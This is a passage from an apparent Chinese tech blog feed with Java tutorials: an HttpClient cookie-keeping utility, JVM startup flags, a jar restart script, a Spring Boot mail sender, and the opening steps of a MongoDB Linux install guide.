<p>我们在使用httpclient模拟登陆时，要保留登陆时服务器返回的cookie，这时我们要使用BasicCookieStore<br><a id="more"></a><br>maven 配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;httpclient&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.5.3&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;httpmime&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.5.3&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">package org.xxz.util;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.UnsupportedEncodingException;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import org.apache.http.HttpEntity;</span><br><span class="line">import org.apache.http.HttpResponse;</span><br><span class="line">import org.apache.http.NameValuePair;</span><br><span class="line">import org.apache.http.client.ClientProtocolException;</span><br><span class="line">import org.apache.http.client.ResponseHandler;</span><br><span class="line">import org.apache.http.client.config.RequestConfig;</span><br><span class="line">import org.apache.http.client.entity.UrlEncodedFormEntity;</span><br><span class="line">import org.apache.http.client.methods.HttpPost;</span><br><span class="line">import org.apache.http.client.methods.HttpUriRequest;</span><br><span class="line">import org.apache.http.cookie.Cookie;</span><br><span class="line">import org.apache.http.impl.client.BasicCookieStore;</span><br><span class="line">import org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line">import org.apache.http.impl.client.HttpClients;</span><br><span class="line">import org.apache.http.message.BasicNameValuePair;</span><br><span class="line">import org.apache.http.util.EntityUtils;</span><br><span class="line">/*</span><br><span class="line">commons-logging-1.2.jar</span><br><span class="line">httpclient-4.5.3.jar</span><br><span class="line">httpcore-4.4.3.jar</span><br><span class="line">httpmime-4.5.3.jar</span><br><span class="line">*/</span><br><span class="line">public class HttpUtil &#123;</span><br><span class="line">    private static BasicCookieStore cookieStore = new BasicCookieStore();</span><br><span class="line">    </span><br><span class="line">    // 设置请求超时时间</span><br><span class="line">    private static RequestConfig config = RequestConfig.custom()//</span><br><span class="line">            .setSocketTimeout(5000) //</span><br><span class="line">            .setConnectTimeout(5000) //</span><br><span class="line">            .setConnectionRequestTimeout(5000) //</span><br><span class="line">            .build();</span><br><span class="line">    public static String post(String url, Map&lt;String, String&gt; params) &#123;</span><br><span class="line">        HttpPost request = new HttpPost(url);</span><br><span class="line">        request.setConfig(config);</span><br><span class="line">        buildParams(params, request);</span><br><span class="line">        return req(request);</span><br><span class="line">    &#125;</span><br><span class="line">    private static void buildParams(Map&lt;String, String&gt; params, HttpPost request) &#123;</span><br><span class="line">        List&lt;NameValuePair&gt; nameValuePairs = new ArrayList&lt;NameValuePair&gt;();</span><br><span class="line">        if (params != null &amp;&amp; params.size() &gt; 0) &#123;</span><br><span class="line">            for (Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                nameValuePairs.add(new BasicNameValuePair(entry.getKey(), entry.getValue()));</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                request.setEntity(new UrlEncodedFormEntity(nameValuePairs, &quot;utf-8&quot;));</span><br><span class="line">            &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">                throw new RuntimeException(&quot;无效的字符编码&quot;, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private static String req(HttpUriRequest request) &#123;</span><br><span class="line">        CloseableHttpClient httpClient = HttpClients.custom().setDefaultCookieStore(cookieStore).build();</span><br><span class="line">        request.addHeader(&quot;User-Agent&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;);</span><br><span class="line">        ResponseHandler&lt;String&gt; responseHandler = new ResponseHandler&lt;String&gt;() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public String handleResponse(final HttpResponse response) throws ClientProtocolException, IOException &#123;</span><br><span class="line">                int status = response.getStatusLine().getStatusCode();</span><br><span class="line">                System.out.println(&quot;status=&quot; + status);</span><br><span class="line">                HttpEntity entity = response.getEntity();</span><br><span class="line">                return entity != null ? EntityUtils.toString(entity) : null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        String responseBody = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            responseBody = httpClient.execute(request, responseHandler);</span><br><span class="line">        &#125; catch (ClientProtocolException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;-------&quot; + request.getURI() + &quot;-------&quot;);</span><br><span class="line">        System.out.println(&quot;responseBody=&quot; + responseBody);</span><br><span class="line">        printCookie();</span><br><span class="line">        return responseBody;</span><br><span class="line">    &#125;</span><br><span class="line">    private static void printCookie() &#123;</span><br><span class="line">        System.out.print(&quot;cookies=&quot;);</span><br><span class="line">        List&lt;Cookie&gt; cookies = cookieStore.getCookies();</span><br><span class="line">        if (cookies.isEmpty()) &#123;</span><br><span class="line">            System.out.println(&quot;None&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            for (int i = 0; i &lt; cookies.size(); i++) &#123;</span><br><span class="line">                System.out.print(cookies.get(i).toString());</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;\n------------------------------------------&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> httpclient </tag>
            
            <tag> cookie </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java 启动参数]]></title>
      <url>/2017/java-startup-arguments/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 Java 启动参数<br>在linux用jmeter做压力测试的时候，发现jmeter启动参数，记录一下：</p>
<p>java -server -XX:+HeapDumpOnOutOfMemoryError -Xms512m -Xmx512m -XX:+UseG1GC -XX:MaxGCPauseMillis=250 -XX:G1ReservePercent=20 -Djava.security.egd=file:/dev/urandom -jar xxxx.jar</p>
<p>解释一下上述参数意思：<br><a id="more"></a></p>
<ul>
<li>-server 以Server模式启动，默认启动是以Client模式启动。JVM在client模式默认-Xms是1M，-Xmx是64M；JVM在Server模式默认-Xms是128M，-Xmx是1024M。我们可以通过运行:java -version来查看jvm默认工作在什么模式。</li>
<li>-XX:+HeapDumpOnOutOfMemoryError 设置堆栈内存溢出错误打印</li>
<li>-Xms512m 初始堆大小</li>
<li>-Xmx512m 最大堆大小</li>
<li>-XX:+UseG1GC 使用G1垃圾回收器</li>
<li>-XX:MaxGCPauseMillis=250 每次年轻代垃圾回收的最长时间(最大暂停时间)</li>
<li>-XX:G1ReservePercent=20 为了降低晋升失败机率设置一个假的堆的储备空间的上限大小，默认值是10</li>
<li>-Djava.security.egd=file:/dev/urandom 非阻塞的随机数发生器，与之对应的 file:/dev/random</li>
</ul>
<p>更多虚拟机参数请见《深入JVM虚拟机》</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="">https://zybuluo.com/zhanggang807/note/107634</a><br><a href="">https://zh.wikipedia.org/wiki//dev/random</a></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> jvm </tag>
            
            <tag> jmeter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux重启java程序]]></title>
      <url>/2017/linux-restart-java-application/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 linux重启java程序<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">jarname=&apos;test-1.0&apos;</span><br><span class="line">pid=`ps aux | grep $jarname | grep -v grep | awk &apos;&#123;print $2&#125;&apos;`</span><br><span class="line">echo $pid</span><br><span class="line">kill -9 $pid</span><br><span class="line">nohup java -jar $jarname.jar --spring.profiles.active=test -server -Xms512m -Xmx512m &gt; ./run.log 2&gt;&amp;1 &amp;</span><br><span class="line">echo &quot;start successed!!!&quot;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
            <tag> 脚本 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring boot 发送邮件]]></title>
      <url>/2017/spring-boot-send-mail/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 spring boot如何发送邮件</p>
<p>发送邮件是一个很常用的功能，比如线上故障告警，验证码等功能都会用到，下面我们来看看用spring mail 来实现发送邮件<br><a id="more"></a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.mail.MessagingException;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.FileSystemResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.mail.SimpleMailMessage;</span><br><span class="line"><span class="keyword">import</span> org.springframework.mail.javamail.JavaMailSender;</span><br><span class="line"><span class="keyword">import</span> org.springframework.mail.javamail.MimeMessageHelper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"mail"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailUtil</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JavaMailSender sender;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Getter</span> <span class="meta">@Setter</span></span><br><span class="line">    <span class="keyword">private</span> String from;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送文本邮件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> to 接受人</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subject 主题</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> text 文本</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendText</span><span class="params">(String to, String subject, String text)</span> <span class="keyword">throws</span> MessagingException </span>&#123;</span><br><span class="line">        log.info(<span class="string">"===&gt;to:&#123;&#125;, subject:&#123;&#125;, text:&#123;&#125;"</span>, to, subject, text);</span><br><span class="line">        SimpleMailMessage message = <span class="keyword">new</span> SimpleMailMessage();</span><br><span class="line">        message.setFrom(from);</span><br><span class="line">        message.setTo(to);</span><br><span class="line">        message.setSubject(subject);</span><br><span class="line">        message.setText(text);</span><br><span class="line">        sender.send(message);</span><br><span class="line">        log.info(<span class="string">"===&gt;send text mail finish"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送html邮件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> to</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subject</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> text</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> MessagingException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendHtml</span><span class="params">(String to, String subject, String text)</span> <span class="keyword">throws</span> MessagingException </span>&#123;</span><br><span class="line">    	log.info(<span class="string">"===&gt;to:&#123;&#125;, subject:&#123;&#125;, text:&#123;&#125;"</span>, to, subject, text);</span><br><span class="line">    	MimeMessage message = sender.createMimeMessage();</span><br><span class="line">    	MimeMessageHelper helper = <span class="keyword">new</span> MimeMessageHelper(message, <span class="keyword">true</span>);</span><br><span class="line">    	helper.setTo(to);</span><br><span class="line">    	helper.setFrom(from);</span><br><span class="line">    	helper.setSubject(subject);</span><br><span class="line">    	helper.setText(text, <span class="keyword">true</span>);</span><br><span class="line">    	sender.send(message);</span><br><span class="line">    	log.info(<span class="string">"===&gt;send html mail finish"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送附件邮件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> to</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subject</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> text</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filePath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> MessagingException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendAttachments</span><span class="params">(String to, String subject, String text, String filePath)</span> <span class="keyword">throws</span> MessagingException  </span>&#123;</span><br><span class="line">    	log.info(<span class="string">"===&gt;to:&#123;&#125;, subject:&#123;&#125;, text:&#123;&#125;, filePath:&#123;&#125;"</span>, to, subject, text, filePath);</span><br><span class="line">    	MimeMessage message = sender.createMimeMessage();</span><br><span class="line">    	MimeMessageHelper helper = <span class="keyword">new</span> MimeMessageHelper(message, <span class="keyword">true</span>);</span><br><span class="line">    	helper.setTo(to);</span><br><span class="line">    	helper.setFrom(from);</span><br><span class="line">    	helper.setSubject(subject);</span><br><span class="line">    	helper.setText(text, <span class="keyword">true</span>);</span><br><span class="line">    	FileSystemResource file = <span class="keyword">new</span> FileSystemResource(<span class="keyword">new</span> File(filePath));</span><br><span class="line">    	String attachmentFilename = filePath.substring(filePath.lastIndexOf(File.separator) + <span class="number">1</span>);</span><br><span class="line">    	helper.addAttachment(attachmentFilename, file);</span><br><span class="line">    	sender.send(message);</span><br><span class="line">    	log.info(<span class="string">"===&gt;send attachments mail finish"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送嵌入资源(一般是图片)邮件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> to</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subject</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> text 带图片的邮件&lt;img src=\"cid:resId1\"&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resPath 文件路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resId 静态资源id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> MessagingException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendInlineResource</span><span class="params">(String to, String subject, String text, String resPath, String resId)</span> <span class="keyword">throws</span> MessagingException </span>&#123;</span><br><span class="line">    	log.info(<span class="string">"===&gt;to:&#123;&#125;, subject:&#123;&#125;, text:&#123;&#125;, resPath:&#123;&#125;, resId:&#123;&#125;"</span>, to, subject, text, resPath, resId);</span><br><span class="line">    	MimeMessage message = sender.createMimeMessage();</span><br><span class="line">    	MimeMessageHelper helper = <span class="keyword">new</span> MimeMessageHelper(message, <span class="keyword">true</span>);</span><br><span class="line">    	helper.setTo(to);</span><br><span class="line">    	helper.setFrom(from);</span><br><span class="line">    	helper.setSubject(subject);</span><br><span class="line">    	helper.setText(text, <span class="keyword">true</span>);</span><br><span class="line">    	</span><br><span class="line">    	FileSystemResource resource = <span class="keyword">new</span> FileSystemResource(<span class="keyword">new</span> File(resPath));</span><br><span class="line">    	helper.addInline(resId, resource);</span><br><span class="line">    	sender.send(message);</span><br><span class="line">    	log.info(<span class="string">"===&gt;send inline resource mail finish"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们在看看配置文件怎么配置(application.properties)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">spring.mail.host=smtp-mail.outlook.com</span><br><span class="line">spring.mail.port=587</span><br><span class="line">spring.mail.username=你邮箱的用户名</span><br><span class="line">spring.mail.password=你邮箱的密码</span><br><span class="line">spring.mail.properties.mail.smtp.auth=true</span><br><span class="line">spring.mail.properties.mail.smtp.timeout=180000</span><br><span class="line">spring.mail.properties.mail.smtp.starttls.enable=true</span><br><span class="line">spring.mail.properties.mail.smtp.starttls.required=true</span><br><span class="line">mail.from=你邮箱的用户名</span><br></pre></td></tr></table></figure>
<p>这里我用的是outlook</p>
<p>host 根据不同邮件服务商进行修改</p>
<p>我们来看看测试类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"><span class="keyword">import</span> org.xxz.blog.util.MailUtil;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RunWith</span>(SpringRunner.class)</span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailUtilTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	MailUtil mailUtil;</span><br><span class="line">	</span><br><span class="line">	String to = <span class="string">"修改成要接受邮件的邮箱地址"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendText</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		mailUtil.sendText(to, <span class="string">"测试text"</span>, <span class="string">"测试text"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendHtml</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		mailUtil.sendHtml(to, <span class="string">"测试html"</span>, <span class="string">"&lt;h1&gt;测试html&lt;/h1&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendAttachments</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		mailUtil.sendAttachments(to, <span class="string">"测试attachments"</span>, <span class="string">"测试attachments"</span>, <span class="string">"d:\\attachments.txt"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendInlineResource</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// 注意图片的src=cid:xxx 与后面的要对应</span></span><br><span class="line">		mailUtil.sendInlineResource(to, <span class="string">"测试inlineResource"</span>, <span class="string">"测试inline resource&lt;img src=\"cid:001\"&gt;"</span>, <span class="string">"d:\\ihehe.jpg"</span>, <span class="string">"001"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> spring-boot </tag>
            
            <tag> mail </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MongoDB  linux安装教程]]></title>
      <url>/2017/mongodb-linux-install-tutorial/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 mongodb  linux安装教程</p>
<ol>
<li><p>进入MongoDB下载中心：<a href="http://www.mongodb.org/downloads" target="_blank" rel="noopener">http://www.mongodb.org/downloads</a></p>
</li>
<li><p>根据自己的实际系统环境，下载所要的文件，我的是Linux 64-bit.</p>
<a id="more"></a>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.6.tgz</span><br></pre></td></tr></table></figure>
<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf mongodb-linux-x86_64-2.2.3.tgz</span><br></pre></td></tr></table></figure>
<h2 id="移动目录到-usr-local-mongodb"><a href="#移动目录到-usr-local-mongodb" class="headerlink" title="移动目录到/usr/local/mongodb"></a>移动目录到/usr/local/mongodb</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv mongodb-linux-x86_64-2.2.3 /usr/local/mongodb</span><br></pre></td></tr></table></figure>
<h2 id="进入mongodb目录"><a href="#进入mongodb目录" class="headerlink" title="进入mongodb目录"></a>进入mongodb目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/mongodb</span><br></pre></td></tr></table></figure>
<h2 id="新建自定义数据目录"><a href="#新建自定义数据目录" class="headerlink" title="新建自定义数据目录"></a>新建自定义数据目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir data</span><br></pre></td></tr></table></figure>
<h2 id="新建日志目录"><a href="#新建日志目录" class="headerlink" title="新建日志目录"></a>新建日志目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir logs</span><br></pre></td></tr></table></figure>
